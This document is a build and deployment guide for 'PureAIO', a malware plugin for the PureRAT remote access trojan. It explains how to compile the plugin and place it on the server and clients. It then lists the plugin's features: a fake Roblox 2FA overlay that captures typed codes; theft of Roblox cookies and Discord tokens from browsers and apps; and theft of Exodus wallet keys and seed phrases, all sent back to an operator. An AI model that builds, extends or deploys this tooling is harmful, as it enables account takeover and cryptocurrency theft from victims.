# PureAIO — Build Guide (v2)

## Prerequisites

| Tool | Notes |
|------|-------|
| Visual Studio 2019 / 2022 | .NET 4.7.2 workload required |
| MSBuild (or VS) | ships with VS |
| ILMerge | place `ILMerge.exe` in `References\` |

No Python. No Node. No external overlay process. Fully self-contained C#.

---

## 1. Set up References

Run once from the solution root:

```
setup_references.bat
```

This copies:
- `PluginSDK.dll` from the PureRAT SDK
- `protobuf-net.dll` from the SDK or NuGet package
- `ILMerge.exe` — download from NuGet `ILMerge` package, copy manually

Expected layout after setup:

```
References\
  PluginSDK.dll
  protobuf-net.dll
  ILMerge.exe
```

---

## 2. Build

```bat
msbuild PureAIO.sln /p:Configuration=Release
```

Or open `PureAIO.sln` in Visual Studio and build (Release).

Outputs:
- `PureAIO\bin\Release\PureAIO.dll` — server plugin (copy to PureRAT plugins folder)
- `PureAIO.Client\bin\Release\PureAIO.Client.merged.dll` — client dll (ILMerge'd)

---

## 3. Deploy

| File | Destination |
|------|-------------|
| `PureAIO.dll` | `<PureRAT>\Plugins\` |
| `PureAIO.Client.merged.dll` | Rename to `PureAIO.Client.dll` and place wherever PureRAT loads client plugins |

No auxiliary files needed — the AuthBait overlay is compiled in.

---

## 4. Features

### AuthBait (tab: AuthBait)
- Finds the Roblox game window via `EnumWindows`
- Shows a frameless topmost WinForms overlay drawn with GDI+
- Fake Roblox 2FA dialog — captures the typed code in-process
- Disables the Roblox close button while overlay is active
- 3-minute timeout; returns code or error to operator

### Roblox Cookie (tab: Roblox Cookie)

Sources scanned:
- Roblox UWP / desktop `.dat` files (DPAPI, 5 entropy values)
- Chrome, Edge, Brave, Opera, OperaGX, Vivaldi (AES-GCM master key path)
- Firefox `cookies.sqlite`

Enrichment per cookie (Roblox REST API):
- User ID, username, display name
- Robux balance
- Premium membership status
- Country
- Account creation date

### Discord Token (tab: Discord Token)

Sources scanned:
- Discord stable / PTB / Canary / Development (LevelDB + AES-GCM blobs)
- Chrome, Edge, Brave, Opera, OperaGX, Vivaldi (same LevelDB path)

Enrichment per token (discord.com/api/v10):
- User ID, username, global display name, discriminator
- Email, email verified, phone
- MFA enabled
- Nitro tier (None / Classic / Boost / Basic) + expiry
- Account creation date (derived from snowflake)
- Locale, public flags

### Exodus (tab: Exodus)

**Raw key data collected:**
- `passphrase.json`, `backupkey.json`, `seed.seco`, `keystore.json`, `info.json`
- All `*.seco` blobs (base64 if binary)
- `seed_shard_*.json` (Shamir shares)
- Per-asset `*.wallet.json`, `*.keystore.json`, `*.keys.seco`
- BIP-39 seed phrase scan (12 / 18 / 24-word sequences)

**Balance data:**
- Parsed from `info.json` → ticker, name, balance, USD value, receive address
- Fallback: per-asset `*.wallet.json` files
- Displayed in a separate "Balances" table on the Exodus tab

---

## 5. FILL table

Values that cannot be inferred at build time:

| Symbol | File | What to put there |
|--------|------|-------------------|
| _(none)_ | — | All offsets and paths are runtime-discovered |

The AuthBait overlay discovers the Roblox window at runtime via `EnumWindows` — no hardcoded HWND or PID.

---

## 6. Packet reference

```
AIOPacket (root)
├── AuthBaitStartRequest      → server → client
├── AuthBaitCodeResponse      ← client → server
│       .Success, .Code, .Error
├── RobloxCookieRequest       → server → client
├── RobloxCookieResponse      ← client → server
│       .Success, .Cookies[], .Error
│       CookieEntry: .Source, .Value,
│                   .UserId, .Username, .DisplayName,
│                   .Robux, .IsPremium, .TwoStepEnabled,
│                   .Country, .AccountAge, .EnrichError
├── DiscordTokenRequest       → server → client
├── DiscordTokenResponse      ← client → server
│       .Success, .Tokens[], .Error
│       TokenEntry: .Source, .Value,
│                  .UserId, .Username, .GlobalName, .Discriminator,
│                  .Email, .EmailVerified, .Phone,
│                  .MfaEnabled, .NitroType, .NitroExpiry,
│                  .Flags, .Locale, .AccountCreated, .EnrichError
├── ExodusRequest             → server → client
└── ExodusResponse            ← client → server
        .Success, .Items[], .Balances[], .Error
        ExodusDataEntry: .Kind, .Wallet, .Value
        ExodusBalance:   .Ticker, .Name, .Balance,
                         .FiatValue, .Address, .IsEnabled
```
